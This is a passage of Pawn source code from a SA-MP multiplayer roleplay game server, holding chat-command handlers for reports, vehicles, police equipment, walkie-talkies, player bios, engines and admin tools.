	if(PlayerInfo[playerid][pClan] == 0) return SCM(playerid,COLOR_ROUZ,"You aren't in clan");
		new string1[256];
        new string2[256];
        new bizstring[256];
        new clan = PlayerInfo[playerid][pClan];
        format(string1, 1024, "{26B0BA}Clan Information:{E5E3B3}\n{E5E3B3}Clan Name: {26B0BA}%s \n{E5E3B3}Clan Tag: {26B0BA}%s \n{E5E3B3}Your Rank: {26B0BA}%d",DynamicClans[clan-1][cName],DynamicClans[clan-1][cTag],PlayerInfo[playerid][pcRank]);
        format(string2, 1024, "{E5E3B3}Slots: {26B0BA}%d/%d \n{E5E3B3}Clan ID: {26B0BA}%d",DynamicClans[clan-1][cSlot],DynamicClans[clan-1][cSlots],PlayerInfo[playerid][pClan]);
        format(bizstring, 2000, "%s\n%s",string1, string2);
        ShowPlayerDialog(playerid, 422333333, DIALOG_STYLE_MSGBOX, " {838383}Clan Information", bizstring, "Cancel","");
		}
		return 1;
    }
    if(strcmp(cmd, "/report", true) == 0)
    {
		 if(reportopen == 0) return SCM(playerid,COLOR_GG,"Sry , You can't because report is locked.");
         if(PINFO[playerid][pAdmin] > 0) return SCM(playerid,COLOR_GG,"Admins cannot use /report.");
         if(Reported[playerid] != INVALID_PLAYER_ID) return SCM(playerid,COLOR_GG,"Gozaresh Shoma Ferestade Shod.");
         GetPlayerName(playerid, sendername, sizeof(sendername));
         new length = strlen(cmdtext);
         while ((idx < length) && (cmdtext[idx] <= ' '))
         {
            idx++;
         }
         new offset = idx;
         new result[64];
         while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
         {
            result[idx - offset] = cmdtext[idx];
            idx++;
         }
         result[idx - offset] = EOS;
         if(!strlen(result))
         {
            SendClientMessage(playerid, COL_SYN, "Syntax: /report <Text>");
            return 1;
         }
         format(string, sizeof(string), "[REPORT]: %s(%d): %s", sendername,playerid, (result));
         ABroadCast(COLOR_LIGHTBLUE,string,1);
         Reported[playerid] = INVALID_PLAYER_ID-1;
         format(ReportText[playerid],100,result);
         SendClientMessage(playerid, COLOR_LIGHTRED, "Your report message send to admins!");
         return 1;
    }
    if(!strcmp(cmd,"/reporton",true))
    {
      if(PINFO[playerid][pAdmin] < 2000) return SCM(playerid,COLOR_SFPD,"You are not a founder.");
      if(reportopen == 1) return SCM(playerid,COLOR_ALI,"Report is already unlocked.");

      SCM(playerid,COLOR_GG,"Report has been unlocked seccussfully");
	  reportopen = 1;
	  return 1;
    }
    if(!strcmp(cmd,"/reportoff",true))
    {
      if(PINFO[playerid][pAdmin] < 2000) return SCM(playerid,COLOR_SFPD,"You are not a founder.");
      if(reportopen == 0) return SCM(playerid,COLOR_ALI,"Report is already locked.");

      SCM(playerid,COLOR_GG,"Report has been locked seccussfully");
	  reportopen = 0;
	  return 1;
    }

   if(strcmp(cmd, "/Vdestroyveh", true) == 0 || strcmp(cmd, "/Vdv", true) == 0)
    {
        if(PlayerInfo[playerid][pPremiumAccount] < 100) return SCM(playerid, COLOR_GREEN, "Vip nistid.");
       {
 	   if(!IsPlayerInAnyVehicle(playerid))
	   {
	   SCM(playerid,COL_SYN,"Error: You are not in a vehicle.");
	   return 1;
	   }
	  if(IsPlayerConnected(playerid))
	  {
	  GetPlayerName(playerid, sendername, sizeof(sendername));
	   new veh = GetPlayerVehicleID(playerid);
	   if(created[veh] == 0) return SendClientMessage(playerid, COL_SYN, " This Vehicle Isn't Created With!");
	   if(OwnedMashin[veh] == 1 || OwnedMashin_2[veh] == 1)
	   {
	   SCM(playerid,COL_SYN,"This Vehicle is owned by another player, use /asellcar");
	   return 1;
	   }
	   GetVehicleParamsEx(veh,engine,lights,alarm,doors,bonnet,boot,objective);
               			SetVehicleParamsEx(veh,VEHICLE_PARAMS_OFF,lights,alarm,doors,bonnet,boot,objective);
               			EngineSTATE[veh] = 0;
               			LightsSTATE[veh] = 0;
               			bonnetSTATE[veh] = 0;
               			bootSTATE[veh] = 0;
	   DestroyVehicle(veh);
	   new striing[128];
	   format(striing, sizeof(striing), "[Admin-Warn]: Vip %s Just Destroy vehicleid %d.", sendername,veh);
	   ABroadCast(COLOR_Good,striing,1);
	   SCM(playerid,COLOR_WHITE,"Vehicle Destroyed.");
	   IsValidAVeh[veh] = false;
	   return 1;
	  }
	return 1;
	}
}

   if(strcmp(cmd, "/destroyveh", true) == 0 || strcmp(cmd, "/dv", true) == 0)
    {
     if(PlayerInfo[playerid][pAdmin] <= 3)
     {
	 SCM(playerid,COLOR_GREEN,"Error: Your admin level isn't high enough to use this command.");
	 return 1;
	 }
 	   if(!IsPlayerInAnyVehicle(playerid))
	   {
	   SCM(playerid,COL_SYN,"Error: You are not in a vehicle.");
	   return 1;
	   }
	  if(IsPlayerConnected(playerid))
	  {
	  GetPlayerName(playerid, sendername, sizeof(sendername));
	   new veh = GetPlayerVehicleID(playerid);
	   if(created[veh] == 0) return SendClientMessage(playerid, COL_SYN, " This Vehicle Isn't Created With!");
	   if(OwnedMashin[veh] == 1 || OwnedMashin_2[veh] == 1)
	   {
	   SCM(playerid,COL_SYN,"This Vehicle is owned by another player, use /asellcar");
	   return 1;
	   }
	   GetVehicleParamsEx(veh,engine,lights,alarm,doors,bonnet,boot,objective);
               			SetVehicleParamsEx(veh,VEHICLE_PARAMS_OFF,lights,alarm,doors,bonnet,boot,objective);
               			EngineSTATE[veh] = 0;
               			LightsSTATE[veh] = 0;
               			bonnetSTATE[veh] = 0;
               			bootSTATE[veh] = 0;
	   DestroyVehicle(veh);
	   new striing[128];
	   format(striing, sizeof(striing), "[Admin-Warn]: Admin %s Just Destroy vehicleid %d.", sendername,veh);
	   ABroadCast(COLOR_Good,striing,1);
	   SCM(playerid,COLOR_WHITE,"Vehicle Destroyed.");
	   IsValidAVeh[veh] = false;
	   return 1;
	  }
	return 1;
	}
    if(strcmp(cmd, "/equip", true) == 0)
    {
    if(PINFO[playerid][pGunLic] == 0) return SCM(playerid,COLOR_ALI,"You haven't a weapon license.");
    if(!IsACop(playerid)) return SCM(playerid,COLOR_BLUE,"You are not a Cop.");
    if(!PTP(2.0,playerid,244.331329,118.533126,1003.218750)) return SCM(playerid,COLOR_BLUE,"You are not in Police Armoury(equip place)");
    if(OnDuty[playerid] == 0) return SCM(playerid,COLOR_BLUE,"You are not On-Duty");
    new strgun[150];
    strcat(strgun,"M4\nMP5\nDesert Eagle\nRifle\nShotgun\nSDPistol\nAK-47");
    ShowPlayerDialog(playerid,21356,DIALOG_STYLE_LIST,"Guns list:",strgun,"Select","Cancel");
    return 1;
    }
    if(strcmp(cmd, "/wthelp", true) == 0)
    {
        return SCM(playerid,COL_SYN,"***WALKIE TALKIE*** /wt(speak on walkie talkie), /setfreq(set your walkie talkie freq), /togwt(disable/enable tog)");
    }
    if(strcmp(cmd, "/wt", true) == 0)
    {
        if(PINFO[playerid][pWalkieTalkie] == 1)
        {
            if(strcmp(PlayerSetFreq[playerid],"0.0",true))
            {
                    GetPlayerName(playerid, sendername, sizeof(sendername));
                    new length = strlen(cmdtext);
                    while ((idx < length) && (cmdtext[idx] <= ' '))
                    {
                        idx++;
                    }
                    new offset = idx;
                    new result[64];
                    while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
                    {
                        result[idx - offset] = cmdtext[idx];
                        idx++;
                    }
                    result[idx - offset] = EOS;
                    if(!strlen(result))
                    {
                        SendClientMessage(playerid, COL_SYN, "Syntax: /wt <Text>");
                        return 1;
                    }
                    new stringg[128];
                    format(stringg, sizeof(string), "[WT Freq: %s] %s : %s",PlayerSetFreq[playerid], sendername,(result));
                    SendWalkieMessage(PlayerSetFreq[playerid], COLOR_Good, stringg)
                    return 1;
            }
            else return SCM(playerid,COLOR_LIGHTGREEN,"first set your freq with /setfreq");
        }
        else return SCM(playerid,COLOR_LIGHTGREEN,"You haven't Walkie Talkie, you can buy it from 24-7.");
    }
    if(!strcmp(cmd,"/setfreq",true))
    {
        if(PINFO[playerid][pWalkieTalkie] != 1) return SCM(playerid,COLOR_ALI,"You haven't a Walkie talkie you can buy one from another 24-7");
        tmp = strtok(cmdtext,idx);
        if(!strlen(tmp)) return SCM(playerid,COL_SYN,"Syntax: /setfreq <Freq(60.0-128.0)>");
        if(!strcmp(tmp, "0.0", true) || !strcmp(tmp, "0", true)) { format(PlayerSetFreq[playerid],10,"0.0"); return SCM(playerid,COLOR_Good,"Walkie talkie disabled."); }
        if(strlen(tmp) < 2 || strlen(tmp) > 5) return SCM(playerid,COLOR_ALI,"Invalid Freq, type a freq between 60.0 and 128.0");
        new noqteamount,noqteplace = 9999;
        for(new i;i<strlen(tmp);i++)
        {
            switch(tmp[i])
            {
                case '.':{ noqteamount ++; noqteplace = i; }
            }
        }
        if(noqteamount > 1) return SCM(playerid,COLOR_ALI,"Invalid Freq, type a freq between 60.0 and 128.0");
        if(noqteamount > 0)
        {
            if(noqteplace != 2 && noqteplace != 3) return SCM(playerid,COLOR_ALI,"Invalid Freq, type a freq between 60.0 and 128.0");
        }
        new value1,value2,vv1[5],vv2[5];
        if(noqteamount == 0 && noqteplace == 9999)
        {
            if(strlen(tmp) > 3 || strlen(tmp) < 2) return SCM(playerid,COLOR_ALI,"Invalid Freq, type a freq between 60.0 and 128.0");
            if(strlen(tmp) == 3)
            {
                vv1[0] = tmp[0];
                vv1[1] = tmp[1];
                vv1[2] = tmp[2];
                value1 = strval(vv1);
                if(value1 > 128) return SCM(playerid,COLOR_ALI,"Invalid Freq, type a freq between 60.0 and 128.0");
                vv2[0] = '0';
                value2 = 0;
            }
            else
            {
                vv1[0] = tmp[0];
                vv1[1] = tmp[1];
                value1 = strval(vv1);
                if(value1 < 60) return SCM(playerid,COLOR_ALI,"Invalid Freq, type a freq between 60.0 and 128.0");
                vv2[0] = '0';
                value2 = 0;
            }
        }
        if(noqteplace == 2)
        {
            vv1[0] = tmp[0];
            vv1[1] = tmp[1];
            value1 = strval(vv1);
            if(value1 < 60) return SCM(playerid,COLOR_ALI,"Invalid Freq, type a freq between 60.0 and 128.0");
            vv2[0] = tmp[3];
            value2 = strval(vv2);
            if(value2 > 9 || value2 < 0) return SCM(playerid,COLOR_ALI,"Invalid Freq, type a freq between 60.0 and 128.0");
        }
        if(noqteplace == 3)
        {
            vv1[0] = tmp[0];
            vv1[1] = tmp[1];
            vv1[2] = tmp[2];
            value1 = strval(vv1);
            if(value1 > 128) return SCM(playerid,COLOR_ALI,"Invalid Freq, type a freq between 60.0 and 128.0");
            vv2[0] = tmp[4];
            value2 = strval(vv2);
            if(value2 > 9 || value2 < 0) return SCM(playerid,COLOR_ALI,"Invalid Freq, type a freq between 60.0 and 128.0");
        }
        format(string,256,"You have seted your freq on %i.%i successfully.",value1,value2);
        SCM(playerid,COLOR_Good,string);
        format(string,256,"%d.%d",value1,value2);
        format(PlayerSetFreq[playerid],10,string);
        return 1;
    }
    if(strcmp(cmd, "/mysamp", true) == 0)
    {
                    new strings[40];
                    GetPlayerVersion(playerid, strings, sizeof(strings));
                    format(strings, sizeof(strings), "Your version of SA-MP is %s", strings);
                    SendClientMessage(playerid, COLOR_MEDIC, strings);
                    SCM(playerid,COLOR_LIGHTRED,"If you haven't newer version, download it from our /forum(Type /forum to get forum URL)");
                    return 1;
    }
    if(strcmp(cmd, "/jobs", true) == 0)
    {
		if(OnCheckpoint[playerid] != 0) return SCM(playerid,COLOR_LIGHTRED,"You already have an enable checkpoint.");
		new buyabler[1024];
		format(buyabler,sizeof(buyabler),"Detective \t\tLegal job\nLawyer \t\t\tLegal job\nDrugs Dealer \t\tIllegal job\nCar jacker \t\tIllegal job\nCar Mechanic \t\tLegal job\nBus driver \t\tLegal job\nTrucker \t\tLegal job\nFarmer \t\t\tLegal job\nArms Dealer \t\tIllegal Job\nGarbage man \t\tLegal Job\t\nRanande Sherkat \t\tLegal Job");
		ShowPlayerDialog(playerid,2555,DIALOG_STYLE_LIST,"Jobs List:",buyabler,"Select","Cancel");
		return 1;
	}
///---------------------Bio System By Amir------------------------
    	if(strcmp(cmd, "/SetBio", true) == 0)
	{
    //if(GetPlayerScore(playerid) <= 5) SCM(playerid,-1,"Shoma Bayad Level +5 Bashid");
     	tmp = strtokEx(cmdtext,idx);
     	if(!strlen(tmp)) return SCM(playerid,COL_SYN,"Syntax: /SetBio <Text>");
     	new string[256];
     	format(string,sizeof(string),"%s",tmp);
     	SaveKonStr(playerid,"Bio",string);
	 	PINFO[playerid][pBio] = string;
  		return SCM(playerid,-1,"Tanzim Shod");
    
    }
    	if(strcmp(cmd, "/bio", true) == 0)
    {
        tmp = strtokEx(cmdtext,idx);
     	if(!strlen(tmp)) return SCM(playerid,COL_SYN,"Syntax: /Bio <On/Off>");
     	if(strcmp(tmp, "on", true) == 0)
		 {
			Bio[playerid] = true;
   			return SCM(playerid,-1,"Roshan Shod");
		 }
		 else if(strcmp(tmp, "off", true) == 0)
		 {
			Bio[playerid] = false;
   			return SCM(playerid,-1,"Khamosh Shod");
		 } else return SCM(playerid,COL_SYN,"Syntax: /Bio <On/Off>");
	}
	if(strcmp(cmd, "/cb", true) == 0)
    {
        tmp = strtokEx(cmdtext,idx);
     	if(!strlen(tmp)) return SCM(playerid,COL_SYN,"Syntax: /Bio <On/Off>");
     	new targetid;
     	targetid = ReturnUser2(tmp);
     	if(PINFO[playerid][pAdmin] < 1) return 0;
     	if(PINFO[targetid][pAdmin] > PINFO[playerid][pAdmin]) return 0;
     	if(!IsPlayerConnected(targetid)) return SCM(playerid,-1,"Karbar Mored Nazar Offline Ast.");
     	new string[256],rstr[512];
     	format(string,sizeof(string)," ");
     	SaveKonStr(targetid,"Bio",string);
	 	PINFO[targetid][pBio] = string;
		format(rstr,sizeof(rstr),"{f45642}[Admin-Warn]: {FFFFFF}Admin {f45642}%s{ffffff} Bio {f45642}%s{ffffff} Pak Kard. ",PINFO[playerid][pName],PINFO[targetid][pName]);
		SendAdminMessage(-1,rstr);
  		return SCM(playerid,-1,"Bio Karbar Mored Nazar Pak Shod.");
	}
//---------------------Engine system By AmirSlaYeR----------------
	if(strcmp(cmd, "/engine", true) == 0)
    {
        new vid = GetPlayerVehicleID(playerid);
        if(LockEngine[vid] == true) return SCM(playerid, COLOR_LIGHTRED, "Another admin locked the engine of this vehicle.");
        if(Refueling[playerid] >= 1)
        {
            SCM(playerid,COLOR_LIGHTGREEN,"GasStation: Wait for vehicle refuel successfully.");
            return 1;
        }
        if((OwnedMashin[vid] == 1 && PINFO[MashinOwner[vid]][cFixed] != 1) || (OwnedMashin_2[vid] == 1 && PINFO[MashinOwner_2[vid]][cFixed_2] != 1))
        {
            return 1;
        }
        if(OnRentMashinMessage[playerid] == true) return 1;
        if(IsPlayerConnected(playerid))
        {
            if(IsPlayerInAnyVehicle(playerid))
            {
                if(Benzin[vid] == 0)
                {
                    SCM(playerid,COLOR_LIGHTGREEN,"No fuel in vehicle, Call a mechanic with /service mechanic or buy a gas can");
                    GetVehicleParamsEx(vid,engine,lights,alarm,doors,bonnet,boot,objective);
                    SetVehicleParamsEx(vid,VEHICLE_PARAMS_OFF,lights,alarm,doors,bonnet,boot,objective);
                    EngineSTATE[vid] = 0;
                    return 1;
                }
                if(!engineOn[GetPlayerVehicleID(playerid)])
                {
                    if(GetPlayerState(playerid) == PLAYER_STATE_PASSENGER)
                    {
                        return 1;
                    }
                    if(pveh == 510 || pveh == 481 || pveh == 509)
                    {
                        SCM(playerid,COLOR_LIGHTBLUE,"can't stop engine or start for bikes, its already start of Engine on.");
                        GetVehicleParamsEx(vid,engine,lights,alarm,doors,bonnet,boot,objective);
                        SetVehicleParamsEx(vid,VEHICLE_PARAMS_ON,lights,alarm,doors,bonnet,boot,objective);
                        EngineSTATE[vid] = 1;
                        return 1;
                    }
                    if(vid == 31 || vid == 32 || vid == 33 || vid == 34 || vid == 35 || vid == FBIVeh[13] || vid == FBIVeh[14])
                    {
                        new playerveh = GetPlayerVehicleID(playerid);
                        new vehicles = GetVehicleModel(playerveh) - 400;
                        if(EngineSTATE[vid] == 0)
                        {
                            GetVehicleParamsEx(vid,engine,lights,alarm,doors,bonnet,boot,objective);
                            SetVehicleParamsEx(vid,VEHICLE_PARAMS_ON,lights,alarm,doors,bonnet,boot,objective);
                            EngineSTATE[vid] = 1;
                            GetPlayerName(playerid, sendername, sizeof(sendername));
                            TogglePlayerControllable(playerid, 1);
                            format(string, sizeof(string), "{FFFFFF}%s {57e547}starts the engine of the Police {FFFFFF}%s.", sendername,aVehicleNames[vehicles]);
                            ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
                            if(OnSpeedc[playerid] == 1)
                            {
                                KillTimer(SpeedTimer[playerid]);
                                SpeedTimerUsed[playerid] = false;
                                SpeedTimer[playerid] = 0;
                                OnSpeedc[playerid] = 0;
                                SCM(playerid,COLOR_ALI,"Speed Camera {FFFFFF}Disabled.");
                            }
                            return 1;
                        }
                        else
                        {
                            GetVehicleParamsEx(vid,engine,lights,alarm,doors,bonnet,boot,objective);
                            SetVehicleParamsEx(vid,VEHICLE_PARAMS_OFF,lights,alarm,doors,bonnet,boot,objective);
                            EngineSTATE[vid] = 0;
                            GetPlayerName(playerid, sendername, sizeof(sendername));
                            format(string, sizeof(string), "{FFFFFF}%s {57e547}stops the engine of the Police {FFFFFF}%s.", sendername,aVehicleNames[vehicles]);
                            ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
                            if(OnSpeedc[playerid] == 1)
                            {
                                KillTimer(SpeedTimer[playerid]);
                                SpeedTimerUsed[playerid] = false;
                                SpeedTimer[playerid] = 0;
                                OnSpeedc[playerid] = 0;
                                SCM(playerid,COLOR_ALI,"Speed Camera {FFFFFF}Disabled.");
                            }
                            return 1;
                        }
                    }
                    new playerveh = GetPlayerVehicleID(playerid);
                    new vehicles = GetVehicleModel(playerveh) - 400;
                    if(EngineSTATE[vid] == 0)
                    {
                        GetVehicleParamsEx(vid,engine,lights,alarm,doors,bonnet,boot,objective);
                        SetVehicleParamsEx(vid,VEHICLE_PARAMS_ON,lights,alarm,doors,bonnet,boot,objective);
                        EngineSTATE[vid] = 1;
                        GetPlayerName(playerid, sendername, sizeof(sendername));
                        TogglePlayerControllable(playerid, 1);
                        format(string, sizeof(string), "{FFFFFF}%s {57e547}starts the engine of the {FFFFFF}%s.", sendername,aVehicleNames[vehicles]);
                        ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
                        if(OnSpeedc[playerid] == 1)
                        {
                            KillTimer(SpeedTimer[playerid]);
                            SpeedTimerUsed[playerid] = false;
                            SpeedTimer[playerid] = 0;
                            OnSpeedc[playerid] = 0;
                            SCM(playerid,COLOR_ALI,"Speed Camera {FFFFFF}Disabled.");
                        }
                    }
                    else
                    {
                        GetVehicleParamsEx(vid,engine,lights,alarm,doors,bonnet,boot,objective);
                        SetVehicleParamsEx(vid,VEHICLE_PARAMS_OFF,lights,alarm,doors,bonnet,boot,objective);
                        EngineSTATE[vid] = 0;
                        GetPlayerName(playerid, sendername, sizeof(sendername));
                        format(string, sizeof(string), "{FFFFFF}%s {57e547}stops the engine of the {FFFFFF}%s.", sendername,aVehicleNames[vehicles]);
                        ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
                        if(OnSpeedc[playerid] == 1)
                        {
                            KillTimer(SpeedTimer[playerid]);
                            SpeedTimerUsed[playerid] = false;
                            SpeedTimer[playerid] = 0;
                            OnSpeedc[playerid] = 0;
                            SCM(playerid,COLOR_ALI,"Speed Camera {FFFFFF}Disabled.");
                        }
                    }
                }
            }
        }
        return 1;
    }
//---------------------getip------------------
    if(strcmp(cmd, "/getip", true) == 0)
    {
        if (PlayerInfo[playerid][pAdmin] >= 5)
        {
            tmp = strtok(cmdtext,idx);
            new playersip[256];
            if(!strlen(tmp))
            {
                SendClientMessage(playerid,COL_SYN,"Syntax: /getip <PlayerID/PartOfName>");
                return 1;
            }
            giveplayerid = ReturnUser(tmp);
            GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
            GetPlayerIp( giveplayerid,playersip,sizeof(playersip));
            format(string, sizeof(string), "Player: %s IP: %s",giveplayer,playersip);
            SendClientMessage(playerid,COLOR_GRAD2,string);
        }
        else
        {
        SCM(playerid,COLOR_YELLOW2,"Error: Error: Your admin level isn't high enough to use this command.");
        return 1;
        }
        return 1;
    }
        if(strcmp(cmd, "/nitro", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            if(PlayerInfo[playerid][pAdmin] <= 3)
            {
                SendClientMessage(playerid, COLOR_GREEN, "Error: Your admin level isn't high enough to use this command.");
                return 1;
            }
            if(IsPlayerInAnyVehicle(playerid))
            {
                AddVehicleComponent(GetPlayerVehicleID(playerid), 1010);
                SendClientMessage(playerid, COLOR_Good, "Vehicle nitro installed.");
            }
        }
        return 1;
    }

        if(strcmp(cmd, "/Vnitro", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
        if(PlayerInfo[playerid][pPremiumAccount] < 100) return SCM(playerid, COLOR_GREEN, "Vip nistid.");
            if(IsPlayerInAnyVehicle(playerid))
            {
                AddVehicleComponent(GetPlayerVehicleID(playerid), 1010);
                SendClientMessage(playerid, COLOR_Good, "Vehicle nitro installed.");
            }
        }
        return 1;
    }

    if (strcmp(cmd, "/fly", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            if (PlayerInfo[playerid][pAdmin] >= 1)
            {
                new Float:px, Float:py, Float:pz, Float:pa;
                GetPlayerFacingAngle(playerid,pa);
                if(pa >= 0.0 && pa <= 22.5) //n1
                {
                    GetPlayerPos(playerid, px, py, pz);
                    SetPlayerPosEx(playerid, px, py+30, pz+5);
                }
                if(pa >= 332.6 && pa < 0.0) //n2
                {
                    GetPlayerPos(playerid, px, py, pz);
                    SetPlayerPosEx(playerid, px, py+30, pz+5);
                }
                if(pa >= 22.6 && pa <= 67.5) //nw
                {
                    GetPlayerPos(playerid, px, py, pz);
                    SetPlayerPosEx(playerid, px-15, py+15, pz+5);
                }
                if(pa >= 67.6 && pa <= 112.5) //w
                {
                    GetPlayerPos(playerid, px, py, pz);
                    SetPlayerPosEx(playerid, px-30, py, pz+5);
                }
                if(pa >= 112.6 && pa <= 157.5) //sw
                {
                    GetPlayerPos(playerid, px, py, pz);
                    SetPlayerPosEx(playerid, px-15, py-15, pz+5);
                }
                if(pa >= 157.6 && pa <= 202.5) //s
                {
                    GetPlayerPos(playerid, px, py, pz);
                    SetPlayerPosEx(playerid, px, py-30, pz+5);
                }
                if(pa >= 202.6 && pa <= 247.5)//se
                {
                    GetPlayerPos(playerid, px, py, pz);
                    SetPlayerPosEx(playerid, px+15, py-15, pz+5);
                }
                if(pa >= 247.6 && pa <= 292.5)//e
                {
                    GetPlayerPos(playerid, px, py, pz);
                    SetPlayerPosEx(playerid, px+30, py, pz+5);
                }
                if(pa >= 292.6 && pa <= 332.5)//e
                {
                    GetPlayerPos(playerid, px, py, pz);
                    SetPlayerPosEx(playerid, px+15, py+15, pz+5);
                }
                if(pa >= 332.6 && pa <= 360.9)//0 :| added eblis
                {
                GetPlayerPos(playerid,px,py,pz);
                SetPlayerPosEx(playerid,px,py+30,pz+5);
                }
            }
            else
            {
                SendClientMessage(playerid, COLOR_YELLOW2, "Error: Your admin level isn't high enough to use this command.");
            }
        }
        return 1;
    }
    //------------------------------------------------[Admin Give Materials]-------------------------------------
    if(strcmp(cmd, "/agivemats", true) == 0)
    {
        if (PlayerInfo[playerid][pAdmin] >= 9)
        {
            if(IsPlayerConnected(playerid))
            {
                tmp = strtok(cmdtext, idx);
                if(!strlen(tmp))
                {
                    SendClientMessage(playerid, COL_SYN, "Syntax: /agivemats <PlayerID/PartOfName> <Amount>");
                    return 1;
                }
                giveplayerid = ReturnUser(tmp);
                tmp = strtok(cmdtext, idx);
                if(!strlen(tmp))
                {
                    SendClientMessage(playerid, COL_SYN, "Syntax: /agivemats <PlayerID/PartOfName> <Amount>");
                    return 1;
                }
                new playa;
                GetPlayerName(playa, sendername, sizeof(sendername));
                playa = ReturnUser(tmp);
                moneys = strval(tmp);
                PlayerInfo[giveplayerid][pMats] = moneys;
                SaveKonVal(giveplayerid, "pMats", moneys);
                GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
                GetPlayerName(playerid, sendername, sizeof(sendername));
                format(string, 256, "[Admin-Warn]: Admin {FFFFFF}%s has give mats {FFFFFF}%s mats {FFFFFF}%d", sendername,giveplayer,moneys);
                ABroadCast(COLOR_Good,string,1);
            }
        }
        else
        {
        SCM(playerid,COLOR_GREEN,"Error: Your admin level isn't high enough to use this command.");
        return 1;
        }
        return 1;
    }
    if(strcmp(cmd, "/agivedr", true) == 0)
    {
        if (PlayerInfo[playerid][pAdmin] >= 9)
        {
            if(IsPlayerConnected(playerid))
            {
                tmp = strtok(cmdtext, idx);
                if(!strlen(tmp))
                {
                    SendClientMessage(playerid, COL_SYN, "Syntax: /agivedr <PlayerID/PartOfName> <Amount>");
                    return 1;
                }
                giveplayerid = ReturnUser(tmp);
                tmp = strtok(cmdtext, idx);
                if(!strlen(tmp))
                {
                    SendClientMessage(playerid, COL_SYN, "Syntax: /agivedr <PlayerID/PartOfName> <Amount>");
                    return 1;
                }
                new playa;
                GetPlayerName(playa, sendername, sizeof(sendername));
                playa = ReturnUser(tmp);
                moneys = strval(tmp);
                PlayerInfo[giveplayerid][pDrugs] = moneys;
                SaveKonVal(giveplayerid, "pDrugs", moneys);
                GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
                GetPlayerName(playerid, sendername, sizeof(sendername));
                format(string, 256, "[Admin-Warn]: Admin {FFFFFF}%s has give drugs {FFFFFF}%s mats {FFFFFF}%d", sendername,giveplayer,moneys);
                ABroadCast(COLOR_Good,string,1);
            }
        }
        else
        {
        SCM(playerid,COLOR_GREEN,"Error: Your admin level isn't high enough to use this command.");
        return 1;
        }
        return 1;
    }
 if(strcmp(cmd, "/dumptrash", true) == 0)
    {
    if(PlayerInfo[playerid][pJob] != 20) return SCM(playerid,COLOR_LIGHTBLUE,"You are not a garbage man.");
    if(!IsPlayerInRangeOfPoint(playerid,10.0,2109.051269,-2009.960083,13.546875)) return SCM(playerid,COLOR_LIGHTRED,"You are not in dump trash place(in HQ).");
    if(!trashcar(GetPlayerVehicleID(playerid))) return SCM(playerid,COLOR_LIGHTBLUE,"You are not in trash car.");
    if(Trashes[playerid] == 0) return SCM(playerid,COLOR_ROUZ,"You haven't any trash with you.");
    new sttr[256];
    new dumptrash = Trashes[playerid]*60;
    format(sttr,256,"You dump your trashes for $%s",FormatNumber(dumptrash));
    SCM(playerid,COLOR_ROUZ,sttr);
    GivePlayerPool(playerid,dumptrash);
    Trashes[playerid] = 0;
    Benzin[GetPlayerVehicleID(playerid)] = 100;
    DarsadBenzin[GetPlayerVehicleID(playerid)] = 0;
    return 1;
    }
    if(!strcmp(cmd,"/speedlimit",true))
    {
        if(!IsPlayerInAnyVehicle(playerid)) return SCM(playerid, COL_SYN, "You are not in a vehicle.");
        if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SCM(playerid, COL_SYN, "You must be the driver of this vehicle.");
        new veh = GetPlayerVehicleID(playerid), vmo = GetVehicleModel(veh);
        if(vmo == 509 || vmo == 510 || vmo == 481 || IsAPlane(veh)) return SCM(playerid, COL_SYN, "This vehicle hasen't a speed limit system.");
        tmp = strtok(cmdtext,idx);
        if(!strlen(tmp)) {SCM(playerid,COL_SYN,"Syntax: /speedlimit <Speed>"); return SCM(playerid,COL_SYN,"Use 0 for Speed to disable speed limit system.");}
        new sorat = strval(tmp);
        if((sorat < 50 || sorat > 230) && sorat != 0) return SCM(playerid,COLOR_ALI,"Error: Allowed speed is between 50 and 230 or 0 to disable it.");
        if(sorat == 0) format(string, sizeof(string), "Speedlimit {FFFFFF}disabled.");
        else format(string, sizeof(string), "Speedlimit set to %d Km/h", sorat);
        SCM(playerid,COLOR_ALI,string);
        SetVehicleSoratLimit(veh, sorat);
        return 1;
    }
    /*if(strcmp(cmd,"/speedlimit",true)==0)
    {
    if(!IsPlayerConnected(playerid)) return 1;
    if(!IsPlayerInAnyVehicle(playerid)) return SCM(playerid,COLOR_Good,"You are not in any vehicle.");
    if(GetPlayerState(playerid) !=PLAYER_STATE_DRIVER) return SCM(playerid,COLOR_Good,"You are not a driver of this vehicle.");
    new modelid = GetVehicleModel(GetPlayerVehicleID(playerid)),vehicle = GetPlayerVehicleID(playerid);
    if(modelid == 510 || modelid == 509 || modelid == 481 || IsAPlane(vehicle))
    {
    SCM(playerid,COLOR_LIGHTRED,"This vehicle hasen't Speed Limit System.");
    return 1;
    }
    new sttring[256];
     tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
                SendClientMessage(playerid, COL_SYN, "Syntax: /speedlimit <MaxSpeed>");
                SCM(playerid,COLOR_WHITE,"USAGE: 0 will to be disable it.");
                return 1;
            }
            new sorat;
            sorat = strval(tmp);
            if(sorat >= 90 && sorat <= 230 || sorat == 0)
            {
            if(sorat == 0) { DisableVehicleSpeedLimit(vehicle); SCM(playerid,COLOR_ALI,"Speedlimit {FFFFFF}disabled."); return 1; }
            SetVehicleSpeedLimit(vehicle,sorat/200.0);
                format(sttring, sizeof(sttring), "Your max speed of your vehicle set to %d Km/h", sorat);
                SCM(playerid,COLOR_ALI,sttring);
                return 1;
            }
            else { SCM(playerid,COLOR_ALI,"Error: Allowed speed is between 90 and 230 or 0 to disable it."); return 1; }
    }*/
if(strcmp(cmd,"/fish",true)==0)
{
